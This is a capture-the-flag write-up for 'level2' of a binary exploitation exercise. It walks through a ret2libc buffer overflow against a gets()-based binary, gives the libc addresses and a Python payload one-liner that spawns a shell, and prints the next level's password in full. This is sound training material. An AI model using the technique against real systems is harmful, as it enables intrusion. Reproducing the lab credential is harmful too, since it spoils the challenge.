# Level2

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level2
  randomstring
  randomstring
```

> It looks like the programs only prints what you write on standard input.

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). Like the previous level, this one uses `gets()`, so we can do a **buffer overflow** once more but this time there is no planned way to spawn a shell inside the program.

After some research we find that since **ASLR** is off, we could do what's called a [`ret2libc attack`](https://shellblade.net/files/docs/ret2libc.pdf). For this to work we only need to find:

- The buffer offset.
- The Addresses of `system()`, `exit()` and one `ret` instruction.
- The Address of the string `/bin/sh`.

Once we get those, we use the buffer overflow to override the list of instruction stored in **EIP register** once again to execute a `system("/bin/sh"); exit();` basically. Thanks to our `gdb` analysis we get:

- Offset is **80**.
- `ret` instruction: `0x0804853e`
- `system()` function: `0xb7e6b060`
- `exit()` function: `0xb7e5ebe0`
- `/bin/sh` string: `0xb7f8cc58`

The attack is constructed as follow: first induce the overflow then trigger a ret instruction followed by a call to `system()` then `exit()` and finally `/bin/sh` by pushing their addresses in this order on top of EIP. Using the `cat` trick like in previous level, we'll get a working shell running as `level3`.

```shell
  $> (python -c "print '\x90' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]"; cat) | ./level2
  $> cat /home/user/level3/.pass
  492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

So next user credentials pair is `level3:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`.

Check [here](./source.c) for reproduction source-code of this binary.